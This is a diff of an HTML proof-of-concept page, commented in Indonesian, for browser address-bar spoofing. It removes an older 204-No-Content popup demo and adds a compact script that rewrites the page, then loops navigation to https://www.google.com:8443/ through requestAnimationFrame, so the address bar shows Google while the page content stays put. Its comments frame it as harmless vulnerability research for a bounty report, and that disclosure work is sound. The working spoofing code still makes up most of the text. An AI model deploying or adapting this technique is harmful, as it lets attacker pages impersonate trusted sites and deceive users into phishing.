@@ -1,54 +1,14 @@
-<!-- MEKANISME: navigasi popup ke endpoint 204 No Content dibatalkan tanpa dokumen; opener menulis ke about:blank yang tersisa selagi address bar sudah melukis URL target. -->
-<meta charset="utf-8">
-<title>2 - Hang via 204 No Content (Knob A)</title>
-<style>
-body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
-code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
-.box{border:1px solid #ccc;border-left:5px solid #666;padding:2px 14px;margin:14px 0;background:#fafafa}
-.v{color:#a00}.s{color:#060}
-button{font:15px inherit;padding:10px 14px;margin:6px 8px 6px 0;cursor:pointer}
-#log{min-height:1.6em;font-weight:600}
-</style>
-
-<h2>2 &mdash; Hang via 204 No Content (Knob A)</h2>
-
-<p>URL asli halaman ini: <code id="here"></code></p>
-
-<div class="box">
-<p><b>Mekanisme:</b> server membalas <code>204 No Content</code>, jadi navigasi <i>dibatalkan</i> dan tidak pernah ada dokumen yang commit. Popup tetap memegang <code>about:blank</code> milik opener, dan opener menulis isinya.</p>
-<p class="v"><b>VULNERABLE:</b> address bar popup menampilkan <code id="t1"></code> padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> setelah 204 diterima, address bar popup menampilkan <code>about:blank</code> / kosong &mdash; URL yang tidak menghasilkan dokumen tidak boleh diatribusikan ke isi jendela.</p>
-</div>
-
-<button id="run">Jalankan mekanisme (endpoint 204)</button>
-<button id="ctrl">Lengan KONTROL (endpoint 200 yang commit)</button>
-
-<p id="log"></p>
-<p>Satu-satunya beda antara dua tombol adalah status respons (204 vs 200); jalur kode identik.</p>
-
+<!-- 02 - dead-port + arm-ulang rAF   [address-bar spoofing | macOS: Dia/Arc/Chrome macOS]
+     MEKANISME : sama seperti 1 tapi mesin arm-ulang = requestAnimationFrame (terikat frame render, tak kena throttle timer).
+     PREDIKAT  : bilah menulis https://www.google.com padahal dokumen tak pernah berpindah.
+     AMAN      : bilah kembali jujur begitu commit/erorr page datang.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>02 dead-port + arm-ulang rAF</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var HANG = 'https://www.google.com/generate_204';
-var GOOD = 'https://www.google.com/robots.txt';
-document.getElementById('here').textContent = location.href;
-document.getElementById('t1').textContent = HANG;
-function log(m){ document.getElementById('log').textContent = m; }
-function paint(w, label){
-  if(!w){ log('Popup diblokir - izinkan popup untuk situs ini lalu ulangi.'); return; }
-  try{
-    w.document.write('<meta charset="utf-8"><title>DEMO MARKER</title>'
-      + '<body style="font:16px/1.5 sans-serif;padding:24px">'
-      + '<div style="font-size:32px;font-weight:700">DEMO MARKER</div>'
-      + '<p>' + label + '</p>'
-      + '<p>Teks ini ditulis oleh opener, bukan oleh server mana pun.</p>'
-      + '<p>location.href dokumen ini: <b id="u">?</b></p>'
-      + '<p>Bandingkan dengan address bar jendela ini.</p>'
-      + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
-    w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup.');
-  }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
-}
-function go(url,label){ var w = window.open(url,'_blank','width=780,height=460');
-  setTimeout(function(){ paint(w,label); }, 60); }
-document.getElementById('run').onclick  = function(){ go(HANG,'lengan UJI - respons 204 No Content'); };
-document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - respons 200 OK'); };
+var T='https://www.google.com:8443/';o.textContent='REAL: '+location.origin;
+function go(){document.write('<h2>BUKAN google.com - '+location.origin+'</h2>');(function r(){location=T;requestAnimationFrame(r);})();}
 </script>
